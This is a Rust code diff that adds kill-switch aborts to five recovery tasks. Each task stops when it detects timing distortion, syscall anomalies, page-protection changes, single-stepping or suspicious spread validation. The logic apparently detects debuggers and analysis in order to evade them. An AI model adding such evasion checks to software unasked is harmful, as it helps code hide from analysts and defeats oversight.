@@ -214,6 +214,9 @@ impl RecoveryTask for TimingDistortionTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = collect_timing_summary().await;
+        if summary.suspicious {
+            return Err(RecoveryError::KillSwitchTriggered);
+        }
         let artifact = write_json_artifact(
             ctx,
             self.category(),
@@ -305,6 +308,9 @@ impl RecoveryTask for SyscallAnomaliesTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = inspect_syscall_anomalies();
+        if summary.anomalies_detected {
+            return Err(RecoveryError::KillSwitchTriggered);
+        }
         let artifact = write_json_artifact(
             ctx,
             self.category(),
@@ -412,6 +418,9 @@ impl RecoveryTask for SpreadValidationTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = collect_spread_validation_summary().await;
+        if summary.suspicious {
+            return Err(RecoveryError::KillSwitchTriggered);
+        }
         let artifact = write_json_artifact(
             ctx,
             self.category(),
@@ -524,6 +533,9 @@ impl RecoveryTask for PageProtectionTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = inspect_page_protections();
+        if summary.anomalies_detected {
+            return Err(RecoveryError::KillSwitchTriggered);
+        }
         let artifact = write_json_artifact(
             ctx,
             self.category(),
@@ -632,6 +644,9 @@ impl RecoveryTask for SingleStepDetectionTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let summary = collect_single_step_summary();
+        if summary.suspicious {
+            return Err(RecoveryError::KillSwitchTriggered);
+        }
         let artifact = write_json_artifact(
             ctx,
             self.category(),
